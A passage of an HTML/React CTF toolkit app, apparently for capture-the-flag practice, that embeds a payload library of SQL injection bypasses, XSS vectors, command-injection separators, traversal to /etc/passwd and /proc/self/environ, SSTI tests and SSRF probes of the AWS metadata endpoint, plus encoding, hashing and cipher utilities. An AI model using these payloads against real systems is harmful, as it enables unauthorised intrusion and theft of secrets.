<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CYPHER//TOOLKIT - Professional CTF Arsenal</title>
    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@700;900&display=swap" rel="stylesheet">
    <style>
        body { margin: 0; font-family: 'JetBrains Mono', monospace; overflow-x: hidden; }
        h1, h2, h3 { font-family: 'Orbitron', sans-serif; }
        @keyframes gridScroll { 0% { transform: translate(0, 0); } 100% { transform: translate(50px, 50px); } }
        @keyframes glowPulse { 0%, 100% { filter: drop-shadow(0 0 8px currentColor); } 50% { filter: drop-shadow(0 0 16px currentColor); } }
        .glow-text { text-shadow: 0 0 10px currentColor, 0 0 20px currentColor, 0 0 30px currentColor; }
        .terminal-border { border: 1px solid; box-shadow: inset 0 0 20px rgba(0, 255, 65, 0.1), 0 0 20px rgba(0, 255, 65, 0.1); }
        .tool-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .tool-card:hover { transform: translateY(-4px); box-shadow: 0 8px 32px rgba(0, 255, 65, 0.2); }
    </style>
</head>
<body>
    <div id="root"></div>
    
<script type="application/json" id="payload-library-data">
{
  "sqli": [
    {
      "name": "Boolean auth bypass (single-quote)",
      "payload": "' OR '1'='1' -- -",
      "tags": "auth,boolean",
      "notes": "Classic boolean-based bypass. May need adaptation to backend/quoting."
    },
    {
      "name": "Boolean auth bypass (double-quote)",
      "payload": "\" OR \"1\"=\"1\" -- -",
      "tags": "auth,boolean",
      "notes": "Useful when input is wrapped in double quotes."
    },
    {
      "name": "Comment truncation",
      "payload": "admin'-- -",
      "tags": "auth,comment",
      "notes": "Tries to comment out the rest of a query after username."
    },
    {
      "name": "UNION basic (3 cols, NULLs)",
      "payload": "' UNION SELECT NULL,NULL,NULL -- -",
      "tags": "union",
      "notes": "Adjust NULL count to match column count."
    },
    {
      "name": "Time delay (MySQL)",
      "payload": "' OR SLEEP(3) -- -",
      "tags": "time",
      "notes": "Simple time-based test (MySQL/MariaDB)."
    },
    {
      "name": "Time delay (PostgreSQL)",
      "payload": "'; SELECT pg_sleep(3) --",
      "tags": "time",
      "notes": "Time-based test (PostgreSQL)."
    },
    {
      "name": "Order by probe",
      "payload": "' ORDER BY 1 -- -",
      "tags": "recon",
      "notes": "Increment ORDER BY to infer column count."
    },
    {
      "name": "Error-based probe",
      "payload": "' AND 1=CONVERT(int,(SELECT @@version)) --",
      "tags": "error",
      "notes": "May trigger visible errors (SQL Server)."
    }
  ],
  "xss": [
    {
      "name": "Simple script tag",
      "payload": "<script>alert(1)<\/script>",
      "tags": "reflected",
      "notes": "Works on permissive contexts. Escaped <\/script> is required inside script blocks."
    },
    {
      "name": "IMG onerror",
      "payload": "<img src=x onerror=alert(1)>",
      "tags": "reflected",
      "notes": "Often works when <script> is filtered but attributes pass."
    },
    {
      "name": "SVG onload",
      "payload": "<svg onload=alert(1)><\/svg>",
      "tags": "reflected",
      "notes": "Common alternative vector."
    },
    {
      "name": "Attribute break-out (double quote)",
      "payload": "\"><img src=x onerror=alert(1)>",
      "tags": "attr",
      "notes": "Use when injection occurs inside an HTML attribute quoted with \". "
    },
    {
      "name": "HTML event handler",
      "payload": "<button onclick=alert(1)>click<\/button>",
      "tags": "dom",
      "notes": "Basic event-handler test."
    }
  ],
  "cmdi": [
    {
      "name": "Command chain (;) + whoami",
      "payload": "; {CMD}",
      "tags": "unix",
      "notes": "Semicolon command chaining; replace {CMD}."
    },
    {
      "name": "Command chain (&&)",
      "payload": "&& {CMD}",
      "tags": "unix",
      "notes": "Runs second command only if first succeeds."
    },
    {
      "name": "Pipe into command (|)",
      "payload": "| {CMD}",
      "tags": "unix",
      "notes": "Pipes output to command; sometimes useful for bypassing."
    },
    {
      "name": "Windows chain (&)",
      "payload": "& {CMD}",
      "tags": "windows",
      "notes": "Windows command separator."
    },
    {
      "name": "Windows chain (&&)",
      "payload": "&& {CMD}",
      "tags": "windows",
      "notes": "Windows conditional chain."
    }
  ],
  "lfi": [
    {
      "name": "Linux passwd",
      "payload": "../../../../../etc/passwd",
      "tags": "linux",
      "notes": "Depth may vary; try adding/removing ../ segments."
    },
    {
      "name": "Linux proc self environ",
      "payload": "../../../../../proc/self/environ",
      "tags": "linux,proc",
      "notes": "Sometimes reveals env vars / secrets."
    },
    {
      "name": "Windows hosts",
      "payload": "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
      "tags": "windows",
      "notes": "Backslashes for Windows paths."
    },
    {
      "name": "Traversal with URL-encoding (../)",
      "payload": "..%2f..%2f..%2fetc%2fpasswd",
      "tags": "encoding",
      "notes": "Use when raw ../ is filtered."
    }
  ],
  "ssti": [
    {
      "name": "Jinja2 basic expression",
      "payload": "{{7*7}}",
      "tags": "jinja2",
      "notes": "If you see 49 rendered, template injection is likely."
    },
    {
      "name": "Handlebars basic",
      "payload": "{{this}}",
      "tags": "handlebars",
      "notes": "Framework detection helper."
    },
    {
      "name": "ERB basic",
      "payload": "<%= 7*7 %>",
      "tags": "erb",
      "notes": "Ruby ERB test."
    }
  ],
  "ssrf": [
    {
      "name": "Localhost probe",
      "payload": "http://127.0.0.1/",
      "tags": "internal",
      "notes": "Checks if server can reach localhost."
    },
    {
      "name": "Metadata (AWS)",
      "payload": "http://169.254.169.254/latest/meta-data/",
      "tags": "cloud",
      "notes": "Cloud metadata endpoint probe (AWS). Use responsibly."
    },
    {
      "name": "Targeted internal host",
      "payload": "http://{IP}:{PORT}/",
      "tags": "internal",
      "notes": "Use placeholders for internal IP/port."
    }
  ],
  "traversal": [
    {
      "name": "Path traversal in parameter",
      "payload": "{TARGET}?{PARAM}=../../../../etc/passwd",
      "tags": "web",
      "notes": "Template shows how traversal looks when used in a URL param."
    },
    {
      "name": "Windows traversal in parameter",
      "payload": "{TARGET}?{PARAM}=..\\..\\..\\Windows\\win.ini",
      "tags": "web,windows",
      "notes": "Common Windows file test."
    }
  ],
  "redirect": [
    {
      "name": "Open redirect (basic)",
      "payload": "{TARGET}?next=https://{DOMAIN}/",
      "tags": "web",
      "notes": "Adjust parameter name to match app (next/url/redirect/return)."
    },
    {
      "name": "Protocol-relative redirect",
      "payload": "{TARGET}?next=//{DOMAIN}/",
      "tags": "web",
      "notes": "Sometimes bypasses filters that block http(s)://."
    }
  ],
  "jwt": [
    {
      "name": "Header/payload placeholder",
      "payload": "HEADER.{PAYLOAD}.SIGNATURE",
      "tags": "tokens",
      "notes": "Use JWT tool to decode/edit/encode. Placeholder entry for workflows."
    }
  ]
}
</script>
<script>
        const Icon = ({ d, className = '', style = {} }) => React.createElement('svg', { className, style, width: '24', height: '24', viewBox: '0 0 24 24', fill: 'none', stroke: 'currentColor', strokeWidth: '2', strokeLinecap: 'round', strokeLinejoin: 'round' }, React.createElement('path', { d }));
        const icons = {
            Shield: (p) => Icon({ ...p, d: 'M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z' }),
            Terminal: (p) => Icon({ ...p, d: 'M4 17l6-6-6-6M12 19h8' }),
            Lock: (p) => Icon({ ...p, d: 'M19 11H5a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7a2 2 0 0 0-2-2zM7 11V7a5 5 0 0 1 10 0v4' }),
            Globe: (p) => Icon({ ...p, d: 'M12 2a10 10 0 1 0 0 20 10 10 0 1 0 0-20zM2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z' }),
            Eye: (p) => Icon({ ...p, d: 'M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z M12 9a3 3 0 1 0 0 6 3 3 0 1 0 0-6z' }),
            Cpu: (p) => Icon({ ...p, d: 'M4 16V8a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2z M9 2v4M15 2v4M9 18v4M15 18v4M2 9h4M2 15h4M18 9h4M18 15h4' }),
            Search: (p) => Icon({ ...p, d: 'M11 2a9 9 0 1 0 0 18 9 9 0 1 0 0-18zM21 21l-4.35-4.35' }),
            ChevronRight: (p) => Icon({ ...p, d: 'M9 18l6-6-6-6' }),
            Zap: (p) => Icon({ ...p, d: 'M13 2L3 14h9l-1 8 10-12h-9l1-8z' }),
            Fingerprint: (p) => Icon({ ...p, d: 'M2 12C2 6.5 6.5 2 12 2a10 10 0 0 1 8 4' }),
            Key: (p) => Icon({ ...p, d: 'M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4' })
        };
        const { useState } = React;
        const e = React.createElement;
        
        // Payload library is stored as JSON (not inline JS) to prevent <\/script> parsing breaks.
        // This makes the payload system future-proof even with large libraries.
        function loadPayloadLibrary() {
            try {
                const el = document.getElementById('payload-library-data');
                if (!el) return {};
                return JSON.parse(el.textContent || '{}');
            } catch (e) {
                console.error('Failed to load payload library JSON', e);
                return {};
            }
        }
function CTFToolkit() {
            const [activeCategory, setActiveCategory] = useState('crypto');
            const [activeTool, setActiveTool] = useState('multi-codec');
            const categories = [
                { id: 'crypto', name: 'Cryptography', icon: 'Lock', color: '#00ff41' },
                { id: 'web', name: 'Web Exploitation', icon: 'Globe', color: '#00d9ff' },
                { id: 'forensics', name: 'Forensics', icon: 'Eye', color: '#ff00ff' },
                { id: 'binary', name: 'Binary/Reversing', icon: 'Cpu', color: '#ffaa00' },
                { id: 'osint', name: 'OSINT/Recon', icon: 'Search', color: '#ff0055' }
            ];
            const tools = {
                crypto: [
                    { id: 'multi-codec', name: 'Multi-Codec Engine', desc: 'Advanced encoding/decoding with auto-detection' },
                    { id: 'hash-analysis', name: 'Hash Analyzer', desc: 'Hash identification & generation' },
                    { id: 'xor-bruteforce', name: 'XOR Bruteforcer', desc: 'Multi-key XOR analysis with scoring' },
                    { id: 'classical-cipher', name: 'Classical Cipher Lab', desc: 'Caesar, Vigenère, frequency analysis' },
                    { id: 'rsa-toolkit', name: 'RSA Calculator', desc: 'Modular arithmetic & factoring' }
                ],
                web: [
                    { id: 'jwt-toolkit', name: 'JWT Swiss Army Knife', desc: 'Decode, modify, forge JWTs' },
                    { id: 'payload-gen', name: 'Payload Generator', desc: 'SQLi, XSS, command injection' },
                    { id: 'url-parser', name: 'URL Parser', desc: 'Parse URLs into components' },
                    { id: 'html-encoder', name: 'HTML Encoder', desc: 'HTML entity encoding' }
                ],
                forensics: [
                    { id: 'hex-editor', name: 'Hex Editor Pro', desc: 'Hex/text conversion & search' },
                    { id: 'file-analyzer', name: 'File Signature Analyzer', desc: 'Identify by magic bytes' },
                    { id: 'string-extractor', name: 'String Extractor', desc: 'Extract ASCII strings' },
                    { id: 'binary-converter', name: 'Binary Converter', desc: 'Format conversion' }
                ,                    { id: 'entropy-check', name: 'Entropy / Randomness', desc: 'Quick entropy score & hints' },
                    { id: 'regex-lab', name: 'Regex Lab', desc: 'Test regex, extract matches' }
                ],
                binary: [
                    { id: 'ascii-converter', name: 'ASCII Converter', desc: 'ASCII code conversion' },
                    { id: 'endian-converter', name: 'Endian Converter', desc: 'Byte order swap' },
                    { id: 'bit-manipulator', name: 'Bit Manipulator', desc: 'Bitwise operations' },
                    { id: 'number-base', name: 'Number Base', desc: 'Dec/Hex/Oct/Bin' }
                ],
                osint: [
                    { id: 'hash-cracker', name: 'Hash Helper', desc: 'Generate variations' },
                    { id: 'username-formatter', name: 'Username Formatter', desc: 'Username formats' },
                    { id: 'email-permutator', name: 'Email Permutator', desc: 'Email variations' },
                    { id: 'phone-formatter', name: 'Phone Formatter', desc: 'Format phone numbers' }
                ,                    { id: 'defang-refang', name: 'Defang / Refang IOCs', desc: 'Safe sharing of URLs/IPs + extract IOCs' },
                    { id: 'timestamp-converter', name: 'Timestamp Converter', desc: 'Unix ↔ human time' },
                    { id: 'cidr-calculator', name: 'CIDR/Subnet Calculator', desc: 'Network ranges & hosts' }
                ]
            };
            const currentCategory = categories.find(c => c.id === activeCategory);
            const currentTools = tools[activeCategory] || [];
            return e('div', { className: 'min-h-screen bg-[#0a0e1a] text-[#e0e0e0] font-mono overflow-hidden' },
                e('div', { className: 'fixed inset-0 opacity-20 pointer-events-none' },
                    e('div', { className: 'absolute inset-0', style: { backgroundImage: 'linear-gradient(rgba(0, 255, 65, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(0, 255, 65, 0.1) 1px, transparent 1px)', backgroundSize: '50px 50px', animation: 'gridScroll 20s linear infinite' }})
                ),
                e('header', { className: 'relative border-b border-[#00ff41] bg-[#0a0e1a]/80 backdrop-blur-sm z-10' },
                    e('div', { className: 'container mx-auto px-6 py-6' },
                        e('div', { className: 'flex items-center justify-between' },
                            e('div', { className: 'flex items-center gap-4' },
                                e(icons.Shield, { className: 'w-10 h-10 text-[#00ff41]', style: { animation: 'glowPulse 2s ease-in-out infinite' }}),
                                e('div', null,
                                    e('h1', { className: 'text-3xl font-bold text-[#00ff41] glow-text tracking-wider' }, 'CYPHER//TOOLKIT'),
                                    e('p', { className: 'text-sm text-[#00ff41]/70 mt-1' }, 'Professional CTF Arsenal v2.0 - COMPLETE EDITION')
                                )
                            ),
                            e('div', { className: 'flex items-center gap-2 text-[#00ff41] text-sm' },
                                e(icons.Terminal, { className: 'w-4 h-4' }),
                                e('span', null, 'SYSTEM READY')
                            )
                        )
                    )
                ),
                e('div', { className: 'container mx-auto px-6 py-8' },
                    e('div', { className: 'grid grid-cols-12 gap-6' },
                        e('div', { className: 'col-span-3' },
                            e('div', { className: 'terminal-border border-[#00ff41]/30 bg-[#0f1419]/80 backdrop-blur-sm rounded-lg p-4' },
                                e('div', { className: 'flex items-center gap-2 mb-6 text-[#00ff41] text-sm font-bold' },
                                    e(icons.Zap, { className: 'w-4 h-4' }), e('span', null, 'CATEGORIES')
                                ),
                                e('div', { className: 'space-y-2' },
                                    ...categories.map(category => {
                                        const isActive = activeCategory === category.id;
                                        const IconComponent = icons[category.icon];
                                        return e('button', {
                                            key: category.id,
                                            onClick: () => { setActiveCategory(category.id); setActiveTool(tools[category.id][0].id); },
                                            className: `w-full flex items-center gap-3 px-4 py-3 rounded transition-all ${isActive ? 'bg-gradient-to-r from-[#00ff41]/20 to-transparent border-l-2 text-[#00ff41]' : 'text-gray-400 hover:text-gray-200 hover:bg-white/5'}`,
                                            style: { borderLeftColor: isActive ? category.color : 'transparent' }
                                        },
                                            e(IconComponent, { className: 'w-5 h-5', style: { color: category.color }}),
                                            e('span', { className: 'text-sm font-medium flex-1 text-left' }, category.name),
                                            isActive && e(icons.ChevronRight, { className: 'w-4 h-4' })
                                        );
                                    })
                                ),
                                e('div', { className: 'mt-8 pt-6 border-t border-[#00ff41]/20' },
                                    e('div', { className: 'text-xs text-gray-500 space-y-2' },
                                        e('div', { className: 'flex justify-between' }, e('span', null, 'Tools:'), e('span', { className: 'text-[#00ff41]' }, Object.values(tools).flat().length)),
                                        e('div', { className: 'flex justify-between' }, e('span', null, 'Session:'), e('span', { className: 'text-[#00d9ff]' }, new Date().toLocaleTimeString()))
                                    )
                                )
                            )
                        ),
                        e('div', { className: 'col-span-9' },
                            e('div', { className: 'mb-6' },
                                e('div', { className: 'flex items-center gap-3 mb-4' },
                                    e('div', { className: 'h-px flex-1 bg-gradient-to-r from-transparent via-[#00ff41]/50 to-transparent' }),
                                    e('h2', { className: 'text-xl font-bold uppercase tracking-wider', style: { color: currentCategory.color }}, currentCategory.name),
                                    e('div', { className: 'h-px flex-1 bg-gradient-to-r from-transparent via-[#00ff41]/50 to-transparent' })
                                ),
                                e('div', { className: 'grid grid-cols-2 gap-4' },
                                    ...currentTools.map(tool => {
                                        const isActive = activeTool === tool.id;
                                        return e('button', {
                                            key: tool.id,
                                            onClick: () => setActiveTool(tool.id),
                                            className: `tool-card text-left p-5 rounded-lg border transition-all ${isActive ? 'bg-gradient-to-br from-[#00ff41]/10 to-transparent border-[#00ff41]' : 'bg-[#0f1419]/80 border-gray-800 hover:border-gray-600'}`
                                        },
                                            e('h3', { className: 'font-bold mb-2', style: { color: isActive ? currentCategory.color : '#e0e0e0' }}, tool.name),
                                            e('p', { className: 'text-xs text-gray-400' }, tool.desc)
                                        );
                                    })
                                )
                            ),
                            e('div', { className: 'terminal-border border-[#00ff41]/30 bg-[#0f1419]/80 backdrop-blur-sm rounded-lg p-6' },
                                e(ToolInterface, { category: activeCategory, tool: activeTool, color: currentCategory.color })
                            )
                        )
                    )
                )
            );
        }
        function ToolInterface({ category, tool, color }) {
            const [input, setInput] = useState('');
            const [output, setOutput] = useState('');

            
            // Tool-specific state (declared unconditionally to keep hook order stable)
            const [detectedEncoding, setDetectedEncoding] = useState('');
            const [hashInfo, setHashInfo] = useState(null);
            const [results, setResults] = useState([]);
            const [shift, setShift] = useState(13);
            const [keyword, setKeyword] = useState('');
            const [rsaN, setRsaN] = useState('');
            const [rsaE, setRsaE] = useState('65537');
            const [rsaP, setRsaP] = useState('');
            const [rsaQ, setRsaQ] = useState('');
            const [jwtHeader, setJwtHeader] = useState('');
            const [jwtPayload, setJwtPayload] = useState('');
            const [jwtSig, setJwtSig] = useState('');
            const [payloadType, setPayloadType] = useState('sqli');
            const [payloadQuery, setPayloadQuery] = useState('');
            const [payloadEncoding, setPayloadEncoding] = useState('none');
            const [payloadTarget, setPayloadTarget] = useState('https://target.local');
            const [payloadParam, setPayloadParam] = useState('q');
            const [payloadCmd, setPayloadCmd] = useState('id');
            const [payloadIP, setPayloadIP] = useState('10.10.10.10');
            const [payloadPort, setPayloadPort] = useState('4444');
            const [hexData, setHexData] = useState('');
            const [minLen, setMinLen] = useState(4);
            const [num, setNum] = useState('');
            const [num2, setNum2] = useState('');
            const [op, setOp] = useState('and');
            const [domain, setDomain] = useState('example.com');
            const [country, setCountry] = useState('+1');
            // Elite utilities state
            const [regexPattern, setRegexPattern] = useState('');
            const [regexFlags, setRegexFlags] = useState('g');
            const [entropyScore, setEntropyScore] = useState('');
            const [iocMode, setIocMode] = useState('defang');
            const [tsInput, setTsInput] = useState('');
            const [cidrIp, setCidrIp] = useState('');
            const [cidrPrefix, setCidrPrefix] = useState('24');

            const copyToClipboard = async (text) => {
                try {
                    if (!text) return;
                    if (navigator.clipboard && window.isSecureContext) {
                        await navigator.clipboard.writeText(text);
                    } else {
                        const ta = document.createElement('textarea');
                        ta.value = text;
                        ta.style.position = 'fixed';
                        ta.style.left = '-9999px';
                        document.body.appendChild(ta);
                        ta.focus();
                        ta.select();
                        document.execCommand('copy');
                        document.body.removeChild(ta);
                    }
                } catch (e) {}
            };

// MULTI-CODEC ENGINE
            if (tool === 'multi-codec') {
const encodings = [
                    { id: 'base64', name: 'Base64', encode: (s) => btoa(s), decode: (s) => atob(s) },
                    { id: 'hex', name: 'Hex', encode: (s) => Array.from(s).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(''), decode: (s) => (s.match(/.{2}/g) || []).map(h => String.fromCharCode(parseInt(h, 16))).join('') },
                    { id: 'url', name: 'URL', encode: encodeURIComponent, decode: decodeURIComponent },
                    { id: 'rot13', name: 'ROT13', encode: (s) => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))), decode: (s) => s.replace(/[a-zA-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))) },
                    { id: 'binary', name: 'Binary', encode: (s) => s.split('').map(c => c.charCodeAt(0).toString(2).padStart(8, '0')).join(' '), decode: (s) => s.split(' ').map(b => String.fromCharCode(parseInt(b, 2))).join('') },
                    { id: 'morse', name: 'Morse', encode: (s) => { const m = {'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---','K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-','U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---','3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.', ' ':'/'}; return s.toUpperCase().split('').map(c => m[c] || c).join(' '); }, decode: (s) => { const m = {'.-':'A','-...':'B','-.-.':'C','-..':'D','.':'E','..-.':'F','--.':'G','....':'H','..':'I','.---':'J','-.-':'K','.-..':'L','--':'M','-.':'N','---':'O','.--.':'P','--.-':'Q','.-.':'R','...':'S','-':'T','..-':'U','...-':'V','.--':'W','-..-':'X','-.--':'Y','--..':'Z','-----':'0','.----':'1','..---':'2','...--':'3','....-':'4','.....':'5','-....':'6','--...':'7','---..':'8','----.':'9','/':' '}; return s.split(' ').map(code => m[code] || code).join(''); }}
                ];
                const detectEncoding = (str) => { if (/^[A-Za-z0-9+/]+=*$/.test(str) && str.length % 4 === 0) return 'base64'; if (/^[0-9a-fA-F]+$/.test(str)) return 'hex'; if (/%[0-9A-F]{2}/.test(str)) return 'url'; if (/^[01\s]+$/.test(str)) return 'binary'; if (/^[.-\/\s]+$/.test(str)) return 'morse'; return 'unknown'; };
                const handleEncode = (enc) => { try { setOutput(encodings.find(e => e.id === enc).encode(input)); } catch(err) { setOutput('Error: ' + err.message); }};
                const handleDecode = (enc) => { try { setOutput(encodings.find(e => e.id === enc).decode(input)); } catch(err) { setOutput('Error: ' + err.message); }};
                const autoDetect = () => { const d = detectEncoding(input); setDetectedEncoding(d); if (d !== 'unknown') handleDecode(d); else setOutput('Unable to detect'); };
                return e('div', { className: 'space-y-4' },
                    e('div', { className: 'flex items-center justify-between mb-4' },
                        e('h3', { className: 'text-lg font-bold', style: { color }}, 'Multi-Codec Engine'),
                        e('button', { onClick: autoDetect, className: 'px-4 py-2 bg-[#00ff41]/20 hover:bg-[#00ff41]/30 border border-[#00ff41] rounded text-[#00ff41] text-sm font-bold'}, e(icons.Fingerprint, { className: 'w-4 h-4 inline mr-2' }), 'AUTO-DETECT')
                    ),
                    detectedEncoding && detectedEncoding !== 'unknown' && e('div', { className: 'bg-[#00ff41]/10 border border-[#00ff41]/30 rounded p-3 text-sm' }, e('strong', { className: 'text-[#00ff41]' }, 'Detected: '), detectedEncoding.toUpperCase()),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'INPUT'), e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none', placeholder: 'Enter text...' })),
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'OUTPUT'), e('textarea', { value: output, readOnly: true, className: 'w-full h-48 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none', placeholder: 'Output...' }))
                    ),
                    e('div', { className: 'grid grid-cols-3 gap-2' }, ...encodings.map(enc => e('div', { key: enc.id, className: 'flex gap-2' }, e('button', { onClick: () => handleEncode(enc.id), className: 'flex-1 px-3 py-2 bg-blue-600/20 border border-blue-500 rounded text-xs font-bold' }, `→ ${enc.name}`), e('button', { onClick: () => handleDecode(enc.id), className: 'flex-1 px-3 py-2 bg-purple-600/20 border border-purple-500 rounded text-xs font-bold' }, `← ${enc.name}`))))
                );
            }

            // HASH ANALYZER
            if (tool === 'hash-analysis') {
const hashPatterns = [{ name: 'MD5', regex: /^[a-f0-9]{32}$/i }, { name: 'SHA-1', regex: /^[a-f0-9]{40}$/i }, { name: 'SHA-256', regex: /^[a-f0-9]{64}$/i }, { name: 'SHA-512', regex: /^[a-f0-9]{128}$/i }];
                const analyzeHash = () => { const t = input.trim(); const m = hashPatterns.filter(p => p.regex.test(t)); if (m.length > 0) { setHashInfo({ length: t.length, possibleTypes: m.map(x => x.name) }); setOutput(`Identified: ${m.map(x => x.name).join(' or ')}\nLength: ${t.length}`); } else { setOutput('Unknown hash type'); }};
                const generateHash = (algo) => { try { let h; switch(algo) { case 'MD5': h = CryptoJS.MD5(input).toString(); break; case 'SHA-1': h = CryptoJS.SHA1(input).toString(); break; case 'SHA-256': h = CryptoJS.SHA256(input).toString(); break; case 'SHA-512': h = CryptoJS.SHA512(input).toString(); break; } setOutput(h); } catch(e) { setOutput('Error'); }};
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'Hash Analyzer'),
                    e('div', { className: 'grid grid-cols-2 gap-4' },
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'INPUT'), e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' })),
                        e('div', null, e('label', { className: 'block text-sm font-bold mb-2 text-gray-400' }, 'OUTPUT'), e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' }))
                    ),
                    e('div', { className: 'flex gap-4' },
                        e('div', { className: 'flex-1' }, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'ANALYZE'), e('button', { onClick: analyzeHash, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, e(icons.Eye, { className: 'w-4 h-4 inline mr-2' }), 'IDENTIFY')),
                        e('div', { className: 'flex-1' }, e('h4', { className: 'text-sm font-bold mb-2 text-gray-400' }, 'GENERATE'), e('div', { className: 'grid grid-cols-2 gap-2' }, ['MD5', 'SHA-1', 'SHA-256', 'SHA-512'].map(a => e('button', { key: a, onClick: () => generateHash(a), className: 'px-3 py-2 bg-[#00d9ff]/20 border border-[#00d9ff] rounded text-xs font-bold' }, a))))
                    ),
                    hashInfo && e('div', { className: 'bg-[#00ff41]/10 border border-[#00ff41]/30 rounded p-4' }, e('h4', { className: 'text-sm font-bold mb-2 text-[#00ff41]' }, 'INFO'), e('div', { className: 'text-sm font-mono' }, e('div', null, 'Types: ', hashInfo.possibleTypes.join(', ')), e('div', null, 'Length: ', hashInfo.length)))
                );
            }

            // XOR BRUTEFORCE
            if (tool === 'xor-bruteforce') {
const xorBruteforce = () => { const r = []; for (let k = 0; k < 256; k++) { let d = '', s = 0; for (let i = 0; i < input.length; i++) { const c = input.charCodeAt(i) ^ k; d += String.fromCharCode(c); if (c >= 32 && c <= 126) s += 1; if ('etaoinshrdlu'.includes(String.fromCharCode(c).toLowerCase())) s += 2; } r.push({ key: k.toString(16).padStart(2, '0'), keyDec: k, score: s, preview: d.substring(0, 80) }); } r.sort((a, b) => b.score - a.score); setResults(r.slice(0, 15)); setOutput('Top 15 results'); };
                return e('div', { className: 'space-y-4' },
                    e('h3', { className: 'text-lg font-bold mb-4', style: { color }}, 'XOR Bruteforce'),
                    e('textarea', { value: input, onChange: (ev) => setInput(ev.target.value), className: 'w-full h-24 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono focus:border-[#00ff41] focus:outline-none resize-none' }),
                    e('button', { onClick: xorBruteforce, className: 'w-full px-4 py-3 bg-[#ff00ff]/20 border border-[#ff00ff] rounded text-[#ff00ff] font-bold' }, e(icons.Zap, { className: 'w-4 h-4 inline mr-2' }), 'BRUTEFORCE (0x00-0xFF)'),
                    results.length > 0 && e('div', { className: 'bg-black/50 border border-gray-700 rounded p-4 max-h-80 overflow-y-auto' }, e('div', { className: 'space-y-2' }, ...results.map((r, i) => e('div', { key: i, className: 'bg-[#0f1419] border border-gray-800 rounded p-3 hover:border-[#00ff41]/50 cursor-pointer', onClick: () => setOutput(r.preview) }, e('div', { className: 'flex justify-between mb-1' }, e('span', { className: 'text-[#00ff41] text-xs font-bold' }, `Key: 0x${r.key} (${r.keyDec})`), e('span', { className: 'text-gray-400 text-xs' }, `Score: ${r.score}`)), e('div', { className: 'text-xs font-mono text-gray-300 truncate' }, r.preview))))),
                    e('textarea', { value: output, readOnly: true, className: 'w-full h-32 bg-black/50 border border-gray-700 rounded p-3 text-sm font-mono resize-none' })
                );
            }
            // CLASSICAL CIPHER
            if (tool === 'classical-cipher') {
const caesarCipher = (text, s, d = false) => { const sh = d ? (26 - (s % 26)) : (s % 26); return text.replace(/[a-zA-Z]/g, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode(((c.charCodeAt(0) - b + sh) % 26) + b); }); };
                const vigenereCipher = (text, key, d = false) => { let res = '', ki = 0; const uk = key.toUpperCase(); for (let i = 0; i < text.length; i++) { const c = text[i]; if (/[a-zA-Z]/.test(c)) { const b = c <= 'Z' ? 65 : 97; const cc = c.toUpperCase().charCodeAt(0) - 65; const kc = uk.charCodeAt(ki % uk.length) - 65; const sh = d ? (cc - kc + 26) % 26 : (cc + kc) % 26; res += String.fromCharCode(sh + b); ki++; } else { res += c; }} return res; };
                const freqAnalysis = (t) => { const f = {}; const l = t.toUpperCase().replace(/[^A-Z]/g, ''); for (let c of l) { f[c] = (f[c] || 0) + 1; } const s = Object.entries(f).sort((a, b) => b[1] - a[1]); return s.slice(0, 10).map(([c, n]) => `${c}: ${n} (${(n/l.length*100).toFixed(1)}%)`).join('\n'); };
